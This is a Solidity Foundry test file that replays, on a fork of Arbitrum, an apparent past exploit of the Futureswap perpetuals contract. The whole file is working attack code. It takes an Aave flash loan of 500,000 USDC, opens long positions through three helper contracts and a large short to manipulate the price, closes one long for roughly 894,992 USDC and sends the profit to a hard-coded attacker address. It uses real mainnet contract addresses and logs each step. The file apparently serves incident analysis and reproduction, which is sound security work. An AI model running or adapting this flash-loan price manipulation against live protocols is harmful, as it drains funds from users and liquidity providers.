// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import {Test, console} from "forge-std/Test.sol";
import {TokenBalanceTracker} from "../../modules/TokenBalanceTracker.sol";
import {IERC20} from "../../interfaces/IERC20.sol";
import {IPool, IFlashLoanSimpleReceiver, IFutureswap} from "./interfaces.sol";

// ============================================
// AUXILIARY CONTRACT (reusable for all positions)
// ============================================

contract AuxiliaryPosition {
    IERC20 private constant USDC = IERC20(0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8);
    IFutureswap private constant FUTURESWAP = IFutureswap(0xF7CA7384cc6619866749955065f17beDD3ED80bC);

    int256 public immutable deltaAsset;
    int256 public immutable deltaStable;
    int256 public immutable stableBound;

    constructor(int256 _deltaAsset, int256 _deltaStable, int256 _stableBound) {
        deltaAsset = _deltaAsset;
        deltaStable = _deltaStable;
        stableBound = _stableBound;
    }

    function execute() external {
        FUTURESWAP.longPosition();

        uint256 stableAmount = uint256(deltaStable);
        require(USDC.balanceOf(address(this)) == stableAmount, "balance mismatch");
        USDC.approve(address(FUTURESWAP), stableAmount);

        FUTURESWAP.changePosition(deltaAsset, deltaStable, stableBound);
    }

    function closePosition(int256 _deltaAsset, int256 _deltaStable, int256 _stableBound) external {
        FUTURESWAP.changePosition(_deltaAsset, _deltaStable, _stableBound);

        uint256 balance = USDC.balanceOf(address(this));
        USDC.transfer(msg.sender, balance);
    }
}

// ============================================
// MAIN EXPLOIT CONTRACT
// ============================================

contract Exploit_Futureswap is Test, TokenBalanceTracker, IFlashLoanSimpleReceiver {

    address constant ATTACKER = 0xbF6EC059F519B668a309e1b6eCb9a8eA62832d95;

    // Block number for fork (one block before the attack)
    uint256 constant ATTACK_BLOCK = 419829770;
                                    
    // Token addresses
    IERC20 private constant WETH = IERC20(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);
    IERC20 private constant USDC = IERC20(0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8);

    // Futureswap contract
    IFutureswap private constant FUTURESWAP = IFutureswap(0xF7CA7384cc6619866749955065f17beDD3ED80bC);

    // Aave V3 Pool on Arbitrum
    IPool private constant AAVE_POOL = IPool(0x794a61358D6845594F94dc1DB02A252b5b4814aD);

    // USDC amounts (6 decimals)
    uint256 constant USDC_1000 = 1_000_000_000;      // 1,000 USDC
    uint256 constant USDC_2000 = 2_000_000_000;      // 2,000 USDC
    uint256 constant USDC_500 = 500_000_000;         // 500 USDC
    uint256 constant USDC_496500 = 496_500_000_000;  // 496,500 USDC
    uint256 constant FLASHLOAN_AMOUNT = 500_000_000_000; // 500,000 USDC

    uint16 constant REFERRAL_CODE = 0;

    // Auxiliary contract instances (replicating attacker's deployed contracts)
    // 0xf1b426708D6ECf02274A789Bbc10A94a1B5A6635: Opens LONG 0.1 ETH with 1,000 USDC collateral
    AuxiliaryPosition public aux_01;
    // 0x8c6be2E20306dD1eC40A7E76f40310943953bA7f: Opens LONG ~0.3246 ETH with 2,000 USDC collateral
    AuxiliaryPosition public aux_02;
    // 0xEa09EA354009818776D41F8E2a9DCDfC9C4e7bEb: Opens LONG 0.001 ETH with 500 USDC collateral
    AuxiliaryPosition public aux_03;

    function setUp() public {
        vm.createSelectFork(vm.envString("RPC_URL"), ATTACK_BLOCK);

        deal(ATTACKER, 0);

        addTokenToTracker(address(WETH));
        addTokenToTracker(address(USDC));

        updateBalanceTracker(ATTACKER);
        updateBalanceTracker(address(FUTURESWAP));
    }

    function test_attack() public {
        console.log("======= FUTURESWAP EXPLOIT =======\n");
        console.log("------- INITIAL BALANCES -------");
        logBalancesWithLabel("Attacker", ATTACKER);
        logBalancesWithLabel("Futureswap", address(FUTURESWAP));

        // Deploy auxiliary contracts (replicating attacker's strategy)
        // 0xf1b426708D6ECf02274A789Bbc10A94a1B5A6635: LONG 0.1 ETH, 1,000 USDC
        aux_01 = new AuxiliaryPosition(0.1 ether, int256(USDC_1000), 0);
        // 0x8c6be2E20306dD1eC40A7E76f40310943953bA7f: LONG ~0.3246 ETH, 2,000 USDC
        aux_02 = new AuxiliaryPosition(324_678_582_642_240_534, int256(USDC_2000), 0);
        // 0xEa09EA354009818776D41F8E2a9DCDfC9C4e7bEb: LONG 0.001 ETH, 500 USDC
        aux_03 = new AuxiliaryPosition(0.001 ether, int256(USDC_500), 0);

        // Run the attack (test contract acts as attacker, profits sent to ATTACKER)
        run();

        console.log("\n------- FINAL BALANCES -------");
        logBalancesWithLabel("Attacker", ATTACKER);
        logBalancesWithLabel("Futureswap", address(FUTURESWAP));
    }

    function run() public {

        console.log("[1] Requesting flashloan: 500,000 USDC");

        AAVE_POOL.flashLoanSimple(
            address(this),
            address(USDC),
            FLASHLOAN_AMOUNT,
            "",
            REFERRAL_CODE
        );
    }

    // Callback function called by Aave after receiving the flashloan
    function executeOperation(
        address /* asset */,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata /* params */
    ) external override returns (bool) {
        require(msg.sender == address(AAVE_POOL), "Caller is not Aave Pool");
        require(initiator == address(this), "Initiator is not this contract");

        // ============================================
        // EXPLOIT LOGIC
        // ============================================

        // Step 1: Update funding rates
        console.log("[2] Calling updateFunding on Futureswap");
        FUTURESWAP.updateFunding();

        // Step 2: Fund aux_01 and open LONG position (0.1 ETH)
        console.log("[3] aux_01: Transfer 1,000 USDC, open LONG 0.1 ETH");
        USDC.transfer(address(aux_01), USDC_1000);
        aux_01.execute();

        // Step 3: Fund aux_02 and open LONG position (~0.3246 ETH)
        console.log("[4] aux_02: Transfer  2,000 USDC, open LONG ~0.3246 ETH");
        USDC.transfer(address(aux_02), USDC_2000);
        aux_02.execute();

        // Step 4: Fund aux_03 and open LONG position (0.001 ETH)
        console.log("[5] aux_03: Transfer 500 USDC, open LONG 0.001 ETH");
        USDC.transfer(address(aux_03), USDC_500);
        aux_03.execute();

        // Step 5: Open SHORT position (-68 ETH) to manipulate price
        console.log("[6] Main contract: Open SHORT -68 ETH with 496,500 USDC collateral");
        USDC.approve(address(FUTURESWAP), USDC_496500);
        FUTURESWAP.changePosition(
            -68 ether,           // deltaAsset = -68 ETH (short)
            int256(USDC_496500), // deltaStable = +496,500 USDC
            0                    // stableBound
        );

        // Step 6: aux_01 closes position and withdraws profit
        console.log("[7] aux_01: Close position, withdraw ~894,992 USDC profit");
        aux_01.closePosition(0, -894_992_852_305, 0);

        // Step 7: Repay flashloan
        uint256 amountOwed = amount + premium;
        console.log("[8] Repaying flashloan");
        USDC.approve(address(AAVE_POOL), amountOwed);

        // After repayment, transfer remaining USDC to attacker
        uint256 remainingAfterRepay = USDC.balanceOf(address(this)) - amountOwed;
        USDC.transfer(ATTACKER, remainingAfterRepay);

        return true;
    }
}
